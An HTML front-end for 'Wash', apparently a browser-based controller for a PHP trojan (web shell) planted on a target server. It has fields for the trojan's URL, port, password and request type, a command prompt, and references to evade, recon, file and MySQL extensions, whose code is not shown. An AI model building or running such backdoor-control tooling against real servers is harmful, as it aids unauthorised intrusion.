<!DOCTYPE html>
<html>
    <head>
        <title>Wash</title>
        <!-- <link rel='stylesheet' href='css/main.css'> -->
        <link rel='stylesheet/less' type='text/css' href='./css/main.less'> 

        <script src='js/jquery.min.js'></script>
        <script src='js/less.min.js'></script>
        <script src='js/mousetrap.min.js'></script>
        <script src='js/command.js'></script>
        <script src='js/response.js'></script>
        <script src='js/keybindings.js'></script>
        <script src='js/key-monitor.js'></script>

        <script src='js/wash.js'></script>
        <script src='js/command.wash.js'></script>
        <script src='js/connection.wash.js'></script>

        <script src='js/shell.js'></script>
        <script src='js/prompt.shell.js'></script>
        <script src='js/history.shell.js'></script>
        <script src='js/output.shell.js'></script>
        <script src='js/status.shell.js'></script>
        <script src='js/connection.shell.js'></script>

        <script src='js/main.js'></script>

        <script src='extensions/evade.wash.js'></script>
        <script src='extensions/file.wash.js'></script>
        <script src='extensions/mysql.wash.js'></script>
        <script src='extensions/recon.wash.js'></script>
    </head>
    <body>
        <div id='shell'>
            <div id='connection'>
                <!-- protocol -->
                <select id='protocol' title='Specify the protocol (http/https).'>
                    <option value='http'>http://</option>
                    <option value='https'>https://</option>
                </select>

                <!-- URL -->
                <input type='text' id='url' placeholder='example.com/path/to/trojan.php'
                    title='Specify the path to the trojan file, including host and protocol.' >

                <!-- port -->
                <input type='number' id='port' value='80' maxlength='5'
                    title='Specify the connection port.' >

                <!-- password -->
                <input type='password' id='password' placeholder='password'
                    title='Specify the password to command the trojan.'>

                <!-- request type -->
                <label>Request Type:
                <select id='request_type' title='Specify the request type.'>
                    <option value='post'>POST</option>
                    <option value='get'>GET</option>
                    <!-- @todo
                    <option value='put'>PUT</option>
                    <option value='delete'>DELETE</option>
                    -->
                </select></label>
            </div>

            <form id='terminal'>

                <!-- derp -->
                <noscript>
                    <p class='warning'>You have JavaScript disabled. Wash needs
                    JavaScript enabled to work.</p>
                </noscript>

                <!-- terminal output will be injected into this div -->
                <pre><div id='output'></div></pre>

                <!-- this is the actual prompt line -->
                <pre><span id='prompt_context'>Specify connection parameters above, then type <code>wash.connect</code> to connect to the target:</span></pre><pre><input autofocus type='text' id='prompt'></pre>
            </form>

            <div id='status'>
                Status text can go here.
            </div>
        </div>
    </body>
</html>
